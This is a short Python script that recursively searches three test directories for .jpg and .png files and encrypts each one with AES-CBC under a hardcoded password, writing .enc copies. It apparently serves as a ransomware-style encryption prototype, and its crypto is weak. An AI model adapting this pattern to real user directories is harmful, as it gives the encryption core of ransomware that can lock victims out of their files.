import os
import hashlib
from Crypto.Cipher import AES
from Crypto import Random
import struct

DIRECTORIES = ["/tmp/prueba1","/tmp/prueba2","/tmp/prueba3"]

EXTENSIONS = [".jpg",".png"]


def encrypt(filepath):
  
  private_key = hashlib.sha256("password".encode("utf-8")).digest()
  iv = Random.new().read(AES.block_size)
  aes = AES.new(private_key, AES.MODE_CBC, iv)
  
  fsz = os.path.getsize(filepath)
  encfile = filepath+".enc"
  print(fsz)
  with open(encfile, 'wb') as fout:
    fout.write(struct.pack('<Q', fsz))
    fout.write(iv)
    sz = 2048
    with open(filepath, 'rb') as fin:
      while True:
        data = fin.read(sz)
        n = len(data)
        if n == 0:
         break
        elif n % 16 != 0:
          data += b' ' * (16 - n % 16) # <- padded with spaces
        encd = aes.encrypt(data)
        fout.write(encd)

def isencryptable(filepaht):
  for extension in EXTENSIONS:
    if filepaht.endswith(extension):
      return True
  return False

def findFiles(directory):
  print(directory)
  for filename in os.listdir(directory):
    filepath = os.path.join(directory,filename)

    if(os.path.isdir(filepath)):
      findFiles(filepath)
    elif isencryptable(filepath):
      encrypt (filepath)



for directory in DIRECTORIES:
  findFiles(directory)
